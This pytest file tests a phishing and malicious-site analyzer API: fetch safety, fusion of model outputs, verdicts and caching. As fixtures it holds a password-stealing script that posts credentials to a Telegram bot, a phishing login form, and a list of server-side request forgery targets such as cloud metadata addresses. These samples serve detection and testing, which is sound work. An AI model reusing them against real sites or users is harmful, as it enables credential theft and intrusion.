"""Part 9 B-1: end-to-end analysis (POST /api/v1/analyze).

No real network: the live fetch goes through ``httpx.MockTransport`` and DNS answers come
from a fake resolver. The model arms are synthetic (fixed probabilities) so the tests do
not need the git-ignored trained models; Parts 2, 3, 5A, 7 and 8 run for real on the HTML.
One integration test uses the real v0.3 models when they are present (skipped otherwise).
"""

from __future__ import annotations

import dataclasses
import json
from pathlib import Path

import httpx
import numpy as np
import pytest
from fastapi.testclient import TestClient

from c2_analyzer.api.dependencies import (
    AnalysisEngine,
    get_engine,
    get_rate_limiter,
    get_result_cache,
)
from c2_analyzer.api.guards import RateLimiter, ResultCache, normalize_url
from c2_analyzer.api.main import create_app
from c2_analyzer.dataset import fetcher as fetcher_module
from c2_analyzer.fusion import orchestrator as orchestrator_module
from c2_analyzer.fusion.calibration import recall_threshold, subset_weights, subsets
from c2_analyzer.fusion.common import FusionConfig
from c2_analyzer.fusion.live_fetch import LiveFetcher, api_fetch_settings, url_download_kind
from c2_analyzer.fusion.orchestrator import BudgetExceeded, Orchestrator, ServingModels
from c2_analyzer.fusion.strategies import WeightedFusion
from c2_analyzer.fusion.verdict import (
    Thresholds,
    VerdictPolicy,
    decide,
    most_probable_threat,
    risk_of,
    subset_key,
)
from c2_analyzer.schemas.analysis import SCHEMA_VERSION, AnalysisRequest, AnalysisResponse
from c2_analyzer.schemas.dom_baseline import FeatureContribution
from c2_analyzer.schemas.nlp import TextModelOutput

LABELS = ["benign", "phishing", "fake_ecommerce", "crypto_scam", "malware_delivery"]
ARMS = ["dom", "behavior", "text_tfidf", "text_xlmr"]
WEIGHTS = {"dom": 0.1, "behavior": 0.3, "text_tfidf": 0.2, "text_xlmr": 0.4}
MALICIOUS, SUSPICIOUS = 0.2, 0.5  # synthetic tier cut-offs on P(benign)

BENIGN = {"benign": 0.9, "phishing": 0.04, "fake_ecommerce": 0.02, "crypto_scam": 0.02,
          "malware_delivery": 0.02}  # fmt: skip
PHISHING = {"benign": 0.05, "phishing": 0.85, "fake_ecommerce": 0.04, "crypto_scam": 0.03,
            "malware_delivery": 0.03}  # fmt: skip

PHISHING_HTML = (
    "<html><head><title>Verify your account</title></head><body>"
    "<h1>Your account will be suspended</h1><p>Sign in within 24 hours.</p>"
    '<form action="https://collector.example/login.php" method="post">'
    '<input type="email" name="email"><input type="password" name="pass">'
    "<button>Sign in</button></form></body></html>"
)
NEWS_HTML = (
    "<html><head><title>Daily news</title></head><body><h1>Weather today</h1>"
    + "<p>A calm and sunny day is expected across the island with light winds.</p>" * 20
    + '<a href="/about">About us</a></body></html>'
)
BOT_CHALLENGE_HTML = (
    "<html><head><title>Just a moment...</title></head><body>"
    "<h1>Checking your browser before accessing the site.</h1>"
    "<p>Please enable JavaScript and cookies to continue.</p></body></html>"
)


# ---- synthetic models ------------------------------------------------------------------------


@dataclasses.dataclass
class FakePrediction:
    predicted: str
    probabilities: dict
    contributions: list = dataclasses.field(default_factory=list)


class FakeText:
    """Stands in for nlp.inference.TextModels (fixed probabilities)."""

    def __init__(self, tfidf: dict, xlmr: dict) -> None:
        self.proba = {"tfidf_logreg": tfidf, "xlmr": xlmr}

    def _out(self, model: str, display: str, enabled: bool = True) -> TextModelOutput:
        if not enabled:
            return TextModelOutput(
                model=model, display_name=display, available=False, reason="model disabled"
            )
        p = self.proba[model]
        return TextModelOutput(
            model=model,
            display_name=display,
            available=True,
            predicted=max(p, key=p.get),
            probabilities=p,
        )

    def predict_many(self, texts: list[str], xlmr: bool = True):
        return [
            [self._out("xlmr", "XLM-R", xlmr), self._out("tfidf_logreg", "TF-IDF")] for _ in texts
        ]

    def model_info(self) -> dict:
        return {}


class FakeModels(ServingModels):
    """ServingModels with synthetic tabular arms (``raise_for`` arms raise)."""

    arm_proba: dict
    raise_for: set

    def predict_tabular(self, arm: str, features: dict):
        if arm in self.raise_for:
            raise RuntimeError(f"{arm} model exploded")
        p = self.arm_proba[arm]
        contribution = FeatureContribution(
            feature="has_password_field",
            name="Password field [has_password_field]",
            description="",
            value=1.0,
            contribution=0.3,
            direction="towards",
            method="test",
            text="Password field = 1 pushes towards phishing",
        )
        return FakePrediction(max(p, key=p.get), p, [contribution])


def synthetic_policy() -> VerdictPolicy:
    policy = VerdictPolicy.load()  # the real floor rules + tier targets
    policy.thresholds = {
        subset_key(arms): Thresholds(subset_key(arms), MALICIOUS, SUSPICIOUS)
        for arms in subsets(ARMS)
    }
    policy.calibration = {"fusion_fingerprint": "synthetic", "created_at": "test"}
    return policy


def make_models(
    arms: dict | None = None, text: tuple[dict, dict] | None = None, raise_for=(), xlmr=True
) -> FakeModels:
    model = WeightedFusion()
    model.arms, model.w, model.n_classes = list(ARMS), np.array([WEIGHTS[a] for a in ARMS]), 5
    bundle = {"strategy": "weighted", "arms": ARMS, "labels": LABELS, "weights": WEIGHTS,
              "trained_at": "test", "params": {"weights": WEIGHTS}}  # fmt: skip
    arms = arms or {"dom": BENIGN, "behavior": BENIGN}
    tfidf, xlm = text or (BENIGN, BENIGN)
    models = FakeModels(
        version="v0.3",
        xlmr_enabled=xlmr,
        fusion_config=FusionConfig.load(),
        policy=synthetic_policy(),
        fusion_bundle=bundle,
        fusion_model=model,
        text=FakeText(tfidf, xlm),
        arm_status={arm: None for arm in ARMS},
    )
    if not xlmr:
        models.arm_status["text_xlmr"] = "model disabled (XLMR_ENABLED=false)"
    models.arm_proba, models.raise_for = arms, set(raise_for)
    return models


# ---- fake network ----------------------------------------------------------------------------


class Network:
    """httpx.MockTransport handler: host -> response factory; records every request."""

    def __init__(self, routes: dict | None = None) -> None:
        self.routes = routes or {}
        self.requested: list[str] = []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requested.append(str(request.url))
        handler = self.routes.get(request.url.host)
        if handler is None:
            raise httpx.ConnectError("connection refused", request=request)
        return handler(request)


class ExplodingStream(httpx.SyncByteStream):
    """A body that fails the test if anyone reads it."""

    def __iter__(self):
        raise AssertionError("the body of a download must never be read")


DNS = {"evil.example": ["10.0.0.5"], "2130706433": ["127.0.0.1"]}


@pytest.fixture(autouse=True)
def fake_dns(monkeypatch):
    monkeypatch.setattr(
        fetcher_module,
        "resolve_addresses",
        lambda host, port: DNS.get(host, ["93.184.216.34"]),
    )


def html_response(html: str, status: int = 200):
    return lambda request: httpx.Response(
        status, headers={"content-type": "text/html; charset=utf-8"}, text=html
    )


def make_orchestrator(models=None, network: Network | None = None) -> Orchestrator:
    settings = dataclasses.replace(
        api_fetch_settings(), rate_per_second=1000.0, per_host_delay_seconds=0.0
    )
    network = network or Network()
    fetcher = LiveFetcher(settings, transport=httpx.MockTransport(network))
    return Orchestrator(models or make_models(), fetcher)


def analyze(orchestrator: Orchestrator, **body) -> AnalysisResponse:
    return orchestrator.analyze(AnalysisRequest(**body))


# ---- fetch safety ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1/admin",
        "http://localhost:8002/health",
        "http://192.168.1.1/",
        "http://[::1]/",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::ffff:127.0.0.1]/",
        "http://2130706433/",  # decimal 127.0.0.1 (caught by the DNS check)
        "https://evil.example/login",  # a public name resolving to 10.0.0.5
    ],
)
def test_private_addresses_are_refused_without_any_request(url):
    network = Network({"evil.example": html_response(PHISHING_HTML)})
    result = analyze(make_orchestrator(network=network), url=url)
    assert network.requested == []
    assert result.status == "unreachable" and result.verdict is None and result.risk_score is None
    assert result.findings[0].id == "fetch.blocked"


def test_redirect_to_a_private_address_is_refused():
    network = Network(
        {
            "short.example": lambda r: httpx.Response(
                302, headers={"location": "http://10.0.0.1/admin"}
            )
        }
    )
    result = analyze(make_orchestrator(network=network), url="https://short.example/x")
    assert network.requested == ["https://short.example/x"]  # never the private hop
    assert result.status == "unreachable" and result.verdict is None
    assert any(f.id == "fetch.blocked" for f in result.findings)


def test_executable_url_is_flagged_without_downloading():
    network = Network({"files.example": html_response("never")})
    result = analyze(make_orchestrator(network=network), url="https://files.example/setup.exe")
    assert network.requested == []  # the path alone decides: no request at all
    assert result.status == "ok"
    assert result.verdict == "Suspicious" and result.threat_class == "malware_delivery"
    top = result.findings[0]
    assert top.id == "fetch.executable_download" and top.raises_verdict
    assert "instead of a webpage" in top.title
    assert result.explanation.evidence_floor_rules == ["fetch.executable_download"]
    assert result.risk_score >= synthetic_policy().for_arms(ARMS).suspicious_risk


def test_executable_content_type_body_is_never_read():
    network = Network(
        {
            "cdn.example": lambda r: httpx.Response(
                200,
                headers={"content-type": "application/x-msdownload"},
                stream=ExplodingStream(),
            )
        }
    )
    result = analyze(make_orchestrator(network=network), url="https://cdn.example/update")
    assert result.verdict == "Suspicious" and result.threat_class == "malware_delivery"
    assert result.findings[0].id == "fetch.executable_download"


def test_download_extensions_reuse_part1_lists():
    assert url_download_kind("https://x.example/a/b/payload.apk") == ".apk"
    assert url_download_kind("http://1.2.3.4/bins/x86_64") == "x86_64"
    assert url_download_kind("https://x.example/logo.png") is None  # not an executable
    assert url_download_kind("https://x.example/index.php") is None


@pytest.mark.parametrize(
    "routes",
    [
        {},  # connection refused / DNS failure
        {"down.example": html_response("<p>gone</p>", status=404)},
        {"down.example": html_response("<p>oops</p>", status=503)},
    ],
)
def test_unreachable_page_gets_no_verdict(routes):
    result = analyze(make_orchestrator(network=Network(routes)), url="https://down.example/")
    assert result.status == "unreachable"
    assert result.verdict is None and result.risk_score is None and result.threat_class is None
    assert result.modalities.dom.status == "skipped"


def test_timeout_is_unreachable():
    def slow(request):
        raise httpx.ReadTimeout("slow", request=request)

    result = analyze(
        make_orchestrator(network=Network({"slow.example": slow})), url="https://slow.example/"
    )
    assert result.status == "unreachable" and "timeout" in result.status_reason


def test_bot_challenge_is_inconclusive():
    network = Network({"cf.example": html_response(BOT_CHALLENGE_HTML)})
    result = analyze(make_orchestrator(network=network), url="https://cf.example/")
    assert result.status == "inconclusive" and "bot challenge" in result.status_reason
    assert result.verdict is None
    assert result.modalities.dom.status == "ok"  # evidence is still returned


def test_suspended_wording_on_a_password_page_is_not_inconclusive():
    # Part 1 flags "account suspended" as a hosting placeholder, but placeholders never ask
    # for a password - phishing lures do.
    html = PHISHING_HTML.replace("Your account will be suspended", "Account suspended")
    models = make_models(arms={"dom": PHISHING, "behavior": PHISHING}, text=(PHISHING, PHISHING))
    result = analyze(make_orchestrator(models), html=html, url="https://bank.example/")
    assert result.status == "ok" and result.verdict == "Malicious"
    assert any("suspended_hosting" in w for w in result.warnings)


def test_non_html_is_inconclusive():
    network = Network(
        {"api.example": lambda r: httpx.Response(200, json={"a": 1})}  # application/json
    )
    result = analyze(make_orchestrator(network=network), url="https://api.example/data")
    assert result.status == "inconclusive" and result.verdict is None


def test_url_mode_records_fetch_facts():
    network = Network(
        {
            "a.example": lambda r: httpx.Response(302, headers={"location": "https://b.example/p"}),
            "b.example": html_response(NEWS_HTML),
        }
    )
    result = analyze(make_orchestrator(network=network), url="https://a.example/")
    assert result.status == "ok" and result.verdict == "Legitimate"
    assert result.input.redirect_hosts == ["a.example", "b.example"]
    assert result.input.final_url == "https://b.example/p" and result.input.http_status == 200
    assert "fetch" in result.timings_ms and "total" in result.timings_ms


# ---- html mode, fusion, degradation, evidence floor -------------------------------------------


def test_html_mode_works_without_fetching():
    models = make_models(arms={"dom": PHISHING, "behavior": PHISHING}, text=(PHISHING, PHISHING))
    network = Network()
    result = analyze(
        make_orchestrator(models, network), html=PHISHING_HTML, url="https://bank.example/login"
    )
    assert network.requested == []
    assert result.input.mode == "html"
    assert result.status == "ok" and result.verdict == "Malicious"
    assert result.threat_class == "phishing" and result.risk_score == 95
    assert result.degraded is False and result.explanation.arms_used == ARMS
    assert result.page_language == "en"
    assert {a.fusion_weight for a in result.modalities.content.arms} == {0.2, 0.4}


def test_one_modality_raising_degrades_but_still_answers(monkeypatch):
    def broken(page):
        raise ValueError("tree-sitter crashed")

    monkeypatch.setattr(orchestrator_module, "analyze_js", broken)
    models = make_models(arms={"dom": PHISHING, "behavior": PHISHING}, text=(PHISHING, PHISHING))
    result = analyze(make_orchestrator(models), html=PHISHING_HTML, url="https://bank.example/")
    assert result.modalities.behavior.status == "failed"
    assert "tree-sitter crashed" in result.modalities.behavior.reason
    assert result.degraded is True and result.verdict == "Malicious"
    assert result.explanation.arms_used == ["dom", "text_tfidf", "text_xlmr"]
    weights = {a.arm: a.fusion_weight for a in result.modalities.content.arms}
    assert weights == {"text_tfidf": round(0.2 / 0.7, 4), "text_xlmr": round(0.4 / 0.7, 4)}
    assert any("Degraded" in w for w in result.warnings)


def test_a_failing_model_arm_degrades():
    models = make_models(raise_for={"dom"})
    result = analyze(make_orchestrator(models), html=NEWS_HTML)
    dom_arm = result.modalities.dom.arms[0]
    assert dom_arm.status == "failed" and "exploded" in dom_arm.reason
    assert result.degraded is True and result.verdict == "Legitimate"


def test_xlmr_disabled_is_not_degraded():
    result = analyze(make_orchestrator(make_models(xlmr=False)), html=NEWS_HTML)
    xlmr = next(a for a in result.modalities.content.arms if a.arm == "text_xlmr")
    assert xlmr.status == "skipped" and result.degraded is False
    assert result.explanation.arms_used == ["dom", "behavior", "text_tfidf"]
    assert any("XLMR_ENABLED=false" in w for w in result.warnings)


def test_evidence_floor_raises_a_low_risk_page():
    # every model says benign (risk 10) but the password form posts to another domain
    result = analyze(
        make_orchestrator(make_models()), html=PHISHING_HTML, url="https://bank.example/login"
    )
    floor = synthetic_policy().for_arms(ARMS).suspicious_risk
    assert result.verdict == "Suspicious" and result.risk_score == floor
    assert result.explanation.verdict_source == "evidence_floor"
    assert "dom.password_form_external_action" in result.explanation.evidence_floor_rules
    assert result.threat_class == "phishing"
    raised = [f for f in result.findings if f.raises_verdict]
    assert raised and raised[0].id in ("dom.password_form_external_action", "fusion.evidence_floor")
    assert any(f.id == "fusion.evidence_floor" for f in result.findings)


def test_benign_page_without_evidence_stays_legitimate():
    result = analyze(make_orchestrator(make_models()), html=NEWS_HTML, url="https://news.example/")
    assert result.verdict == "Legitimate" and result.threat_class == "benign"
    assert result.risk_score == 10 and result.explanation.evidence_floor_rules == []


def test_time_budget_returns_partial_result():
    orchestrator = make_orchestrator()
    with pytest.raises(BudgetExceeded) as late:
        orchestrator.analyze(AnalysisRequest(html=NEWS_HTML), budget=1e-9)
    partial = late.value.response
    assert partial.status == "error" and "time budget" in partial.status_reason


# ---- verdict policy units ---------------------------------------------------------------------


def test_tiers_and_risk_score():
    t = Thresholds("x", malicious=0.2, suspicious=0.5)
    probs = lambda b: {**{k: (1 - b) / 4 for k in LABELS}, "benign": b}  # noqa: E731
    assert decide(probs(0.1), t, []).verdict == "Malicious"
    assert decide(probs(0.3), t, []).verdict == "Suspicious"
    assert decide(probs(0.5), t, []).verdict == "Legitimate"  # cut-off belongs to benign
    assert decide(probs(0.9), t, []).threat_class == "benign"
    assert risk_of(0.0) == 100 and risk_of(1.0) == 0 and risk_of(0.255) == 74
    assert t.malicious_risk == 80 and t.suspicious_risk == 50
    assert most_probable_threat(PHISHING) == "phishing"
    assert decide(None, t, []) is None


def test_floor_never_lowers_a_verdict():
    policy = synthetic_policy()
    t = policy.for_arms(ARMS)
    from c2_analyzer.fusion.verdict import FloorHit

    hit = FloorHit(policy.rules[0])
    decision = decide(PHISHING, t, [hit])
    assert decision.verdict == "Malicious" and decision.source == "fusion"
    assert decision.supported_by == [policy.rules[0].id] and decision.raised_by == []


def test_subset_weights_renormalize_and_recall_threshold():
    model = WeightedFusion()
    model.arms, model.w = list(ARMS), np.array([WEIGHTS[a] for a in ARMS])
    w = subset_weights(model, ["dom", "text_xlmr"])
    assert w == pytest.approx({"dom": 0.2, "text_xlmr": 0.8})
    y = np.array([0, 1, 1, 1, 1])
    proba = np.zeros((5, 5))
    proba[:, 0] = [0.9, 0.1, 0.2, 0.3, 0.6]
    t = recall_threshold(y, proba, 0, 0.75)  # 3 of 4 threats below t
    assert 0.3 < t < 0.3001
    assert (proba[1:, 0] < t).mean() == 0.75


def test_shipped_verdict_config_is_complete():
    policy = VerdictPolicy.load()
    rule_ids = {rule.id for rule in policy.rules}
    for expected in (
        "dom.password_form_external_action",
        "behavior.credential_exfiltration",
        "behavior.keylogging_network",
        "behavior.clipboard_crypto_swap",
        "behavior.auto_risky_download",
        "fetch.executable_download",
    ):
        assert expected in rule_ids
    if policy.thresholds:  # calibrated: every subset, Malicious below Suspicious
        for t in policy.thresholds.values():
            assert 0 < t.malicious <= t.suspicious <= 1


# ---- schema / findings hygiene -------------------------------------------------------------


def test_response_schema_round_trip():
    result = analyze(make_orchestrator(), html=NEWS_HTML)
    data = json.loads(result.model_dump_json())
    again = AnalysisResponse.model_validate(data)
    assert again.schema_version == SCHEMA_VERSION == "c2.analysis.v1"
    assert set(data) >= {
        "analysis_id", "request_id", "analyzed_at", "input", "status", "verdict",
        "threat_class", "risk_score", "class_probabilities", "page_language", "findings",
        "modalities", "explanation", "degraded", "warnings", "model_versions", "timings_ms",
    }  # fmt: skip
    assert sum(data["class_probabilities"].values()) == pytest.approx(1.0, abs=1e-4)


@pytest.mark.parametrize(
    "body",
    [
        {},
        {"url": "ftp://files.example/x"},
        {"url": "javascript:alert(1)"},
        {"url": "https://x.example/" + "a" * 2048},
        {"html": "<p>x</p>", "unexpected": 1},
        {"url": "https://x.example/", "source": "someone"},
    ],
)
def test_request_validation(body):
    with pytest.raises(ValueError):
        AnalysisRequest(**body)


def test_findings_contain_no_raw_html_and_are_pii_masked():
    html = (
        "<html><head><title>Account alert</title></head><body>"
        "<h1>Urgent: account suspended - contact victim.person@gmail.com now</h1>"
        '<form id="f"><input type="password" id="password"><button>Go</button></form>'
        "<script>var api='https://api.telegram.org/bot1:AA/sendMessage';"
        "document.getElementById('f').addEventListener('submit',function(e){"
        "var p=document.getElementById('password').value;"
        "document.write('<iframe src=\"https://x.example/\"></iframe>');"
        "fetch(api,{method:'POST',body:'victim.person@gmail.com '+p});});</script>"
        "</body></html>"
    )
    models = make_models(arms={"dom": PHISHING, "behavior": PHISHING}, text=(PHISHING, PHISHING))
    result = analyze(make_orchestrator(models), html=html, url="https://bank.example/")
    text = json.dumps([f.model_dump() for f in result.findings])
    assert "victim.person@gmail.com" not in text
    assert "<iframe" not in text and "<script" not in text and "<form" not in text
    assert any(f.id.startswith("behavior.credential_exfiltration") for f in result.findings)
    assert len(result.findings) <= 10
    assert result.findings_total == len(result.findings) + result.findings_omitted


# ---- API ---------------------------------------------------------------------------------------


def api_client(orchestrator: Orchestrator, limiter: RateLimiter | None = None) -> TestClient:
    app = create_app("production", warm_up=False)
    engine = AnalysisEngine(factory=lambda: orchestrator)
    engine.get()  # loaded, as after the start-up warm-up
    cache = ResultCache(ttl_seconds=600, max_entries=10)
    app.dependency_overrides[get_engine] = lambda: engine
    app.dependency_overrides[get_result_cache] = lambda: cache
    app.dependency_overrides[get_rate_limiter] = lambda: limiter or RateLimiter(1000, 60)
    return TestClient(app)


def test_api_url_mode_and_cache_hit():
    network = Network({"shop.example": html_response(NEWS_HTML)})
    client = api_client(make_orchestrator(network=network))
    first = client.post(
        "/api/v1/analyze", json={"url": "https://shop.example/", "request_id": "a1"}
    )
    assert first.status_code == 200 and first.json()["cached"] is False
    second = client.post(
        "/api/v1/analyze", json={"url": "HTTPS://Shop.Example:443/#top", "request_id": "a2"}
    )
    body = second.json()
    assert second.status_code == 200 and body["cached"] is True and body["request_id"] == "a2"
    assert body["analysis_id"] == first.json()["analysis_id"]
    assert len(network.requested) == 1  # the second check never touched the server


def test_unreachable_results_are_not_cached():
    network = Network()
    client = api_client(make_orchestrator(network=network))
    for _ in range(2):
        body = client.post("/api/v1/analyze", json={"url": "https://gone.example/"}).json()
        assert body["status"] == "unreachable" and body["cached"] is False
    assert len(network.requested) == 2


def test_api_rate_limit():
    client = api_client(make_orchestrator(), limiter=RateLimiter(2, 60))
    codes = [client.post("/api/v1/analyze", json={"html": NEWS_HTML}).status_code for _ in range(3)]
    assert codes == [200, 200, 429]
    late = client.post("/api/v1/analyze", json={"html": NEWS_HTML})
    assert late.status_code == 429 and int(late.headers["retry-after"]) >= 1


def test_api_validation_errors():
    client = api_client(make_orchestrator())
    big = "<p>" + "a" * (5 * 1024 * 1024) + "</p>"
    assert client.post("/api/v1/analyze", json={"html": big}).status_code == 413
    assert client.post("/api/v1/analyze", json={"url": "ftp://x.example/"}).status_code == 422
    assert client.post("/api/v1/analyze", json={}).status_code == 422
    long_url = {"url": "https://x.example/" + "a" * 2100}
    assert client.post("/api/v1/analyze", json=long_url).status_code == 422
    text = client.post(
        "/api/v1/analyze", content="url=https://x.example/", headers={"content-type": "text/plain"}
    )
    assert text.status_code == 415


def test_api_504_carries_the_partial_result(monkeypatch):
    orchestrator = make_orchestrator()
    monkeypatch.setattr(orchestrator, "budget", 1e-9)
    response = api_client(orchestrator).post("/api/v1/analyze", json={"html": NEWS_HTML})
    assert response.status_code == 504
    assert response.json()["status"] == "error" and response.json()["schema_version"]


def test_ready_reports_models_and_health_is_independent():
    client = api_client(make_orchestrator())
    assert client.get("/health").json()["status"] == "ok"
    ready = client.get("/ready")
    assert ready.status_code == 200
    data = ready.json()
    assert data["ready"] is True and data["xlmr_enabled"] is True
    assert set(data["arms"]) == set(ARMS) and all(a["loaded"] for a in data["arms"].values())
    assert data["model_versions"]["dataset"] == "v0.3" and data["model_versions"]["fusion"]


def test_ready_is_503_while_loading():
    import threading

    gate = threading.Event()
    orchestrator = make_orchestrator()

    def slow():
        gate.wait(5)
        return orchestrator

    app = create_app("production", warm_up=False)
    engine = AnalysisEngine(factory=slow)
    app.dependency_overrides[get_engine] = lambda: engine
    client = TestClient(app)
    first = client.get("/ready")
    assert first.status_code == 503 and first.json()["loading"] is True
    gate.set()
    engine._thread.join(5)
    assert client.get("/ready").status_code == 200


def test_ready_is_503_when_models_fail_to_load():
    def broken():
        raise FileNotFoundError("no fusion model")

    app = create_app("production", warm_up=False)
    engine = AnalysisEngine(factory=broken)
    app.dependency_overrides[get_engine] = lambda: engine
    client = TestClient(app)
    client.get("/ready")  # starts the (failing) background load
    engine._thread.join(5)
    response = client.get("/ready")
    assert response.status_code == 503 and "no fusion model" in response.json()["reason"]
    assert client.post("/api/v1/analyze", json={"html": "<p>x</p>"}).status_code == 503


def test_stale_thresholds_block_verdicts():
    models = make_models()
    models.problems.append("thresholds were calibrated for another fusion model")
    result = analyze(make_orchestrator(models), html=NEWS_HTML)
    assert result.status == "error" and result.verdict is None
    assert not models.ready().ready


def test_cors_only_for_configured_origins(monkeypatch):
    from c2_analyzer.config import get_settings

    monkeypatch.setenv("CORS_ORIGINS", "http://localhost:5173")
    get_settings.cache_clear()
    try:
        client = TestClient(create_app("production", warm_up=False))
        allowed = client.options(
            "/api/v1/analyze",
            headers={"Origin": "http://localhost:5173", "Access-Control-Request-Method": "POST"},
        )
        assert allowed.headers.get("access-control-allow-origin") == "http://localhost:5173"
        other = client.options(
            "/api/v1/analyze",
            headers={"Origin": "https://evil.example", "Access-Control-Request-Method": "POST"},
        )
        assert "access-control-allow-origin" not in other.headers
    finally:
        get_settings.cache_clear()


def test_normalize_url_for_the_cache():
    assert normalize_url("HTTPS://Example.COM:443") == "https://example.com/"
    assert normalize_url("http://example.com:8080/a?b=1#frag") == "http://example.com:8080/a?b=1"
    assert normalize_url("not a url") is None


# ---- real models (integration; skipped when the trained models are not on disk) ---------------

ROOT = Path(__file__).resolve().parents[1]
REAL = ROOT / "models" / "fusion" / "v0.3" / "fusion.joblib"
SAMPLE = "c2_phishing_000081"


@pytest.mark.skipif(not REAL.is_file(), reason="trained v0.3 models not present")
def test_real_models_phishing_sample_with_evidence_floor():
    from c2_analyzer.api.dev_data import DevDataset

    try:
        html, url = DevDataset.from_settings().raw_html("v0.3", SAMPLE)
    except Exception:  # noqa: BLE001
        pytest.skip("dataset sample not present")
    orchestrator = Orchestrator(ServingModels.load(xlmr_enabled=False))
    assert orchestrator.models.ready().ready, orchestrator.models.problems
    result = analyze(orchestrator, html=html, url=url)
    assert result.status == "ok" and result.verdict in ("Suspicious", "Malicious")
    assert "dom.password_form_external_action" in result.explanation.evidence_floor_rules
    assert result.explanation.arms_used == ["dom", "behavior", "text_tfidf"]
